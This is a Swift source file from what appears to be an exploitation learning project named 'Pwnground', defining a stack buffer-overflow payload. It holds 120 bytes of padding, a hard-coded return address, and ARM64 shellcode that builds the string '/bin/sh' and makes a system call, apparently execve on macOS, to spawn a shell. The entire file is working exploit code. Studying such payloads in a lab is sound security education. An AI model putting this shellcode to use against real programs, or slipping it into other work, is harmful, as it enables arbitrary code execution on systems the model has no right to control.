//
//  PayloadProvider.swift
//  Pwnground
//
//  Created by Bartłomiej Pluta
//

import Foundation

class PayloadProvider {
    private init() { }
    
    static var paddedValuesPayload: Data {
        Data(repeating: 0x41, count: 120)
    }
    
    static var addressPayload: Data {
        Data(from: Address(0x7fff_ffff_ff78))
    }
    
    static var shellPath: Data {
        buildPayload(from: shellPathCodeInstructions)
    }
    
    static var fullShellCode: Data {
        buildPayload(from: fullShellCodeInstructions)
    }
    
    private static func buildPayload(from instructions: [ARMInstruction]) -> Data {
        let rawInstructions = instructions.compactMap { try? $0.encode() }
        return Data(fromArray: rawInstructions)
    }
    
    static var shellPathCodeInstructions: [ARMInstruction] {[
        ARMInstructionBuilder.mov(
            register: ARMGeneralPurposeRegister.GP64.x1,
            immediate: 0x622f
        ),
        ARMInstructionBuilder.movk(
            register: ARMGeneralPurposeRegister.GP64.x1,
            immediate: 0x6E69,
            shift: 16
        ),
        ARMInstructionBuilder.movk(
            register: ARMGeneralPurposeRegister.GP64.x1,
            immediate: 0x732F,
            shift: 32
        ),
        ARMInstructionBuilder.movk(
            register: ARMGeneralPurposeRegister.GP64.x1,
            immediate: 0x68,
            shift: 48
        )
    ].compactMap { $0 }}
    
    static var shellcodeTriggerInstructions: [ARMInstruction] {[
        ARMInstructionBuilder.str(
            source: ARMGeneralPurposeRegister.GP64.x1,
            addressRegister: ARMGeneralPurposeRegister.GP64.sp,
            index: -8,
            indexingMode: .pre
        ),
        ARMInstructionBuilder.mov(
            destinationRegister: ARMGeneralPurposeRegister.GP64.x1,
            sourceRegister: ARMGeneralPurposeRegister.GP64.xzr
        ),
        ARMInstructionBuilder.add(
            destination: ARMGeneralPurposeRegister.GP64.x0,
            firstSource: ARMGeneralPurposeRegister.GP64.sp,
            secondSource: ARMGeneralPurposeRegister.GP64.x1
        ),
        ARMInstructionBuilder.mov(
            register: ARMGeneralPurposeRegister.GP64.x16,
            immediate: 0x203b
        ),
        ARMInstructionBuilder.svc(immediate: 0)
    ].compactMap { $0 }}
    
    static var fullShellCodeInstructions: [ARMInstruction] {
        shellPathCodeInstructions + shellcodeTriggerInstructions
    }
}
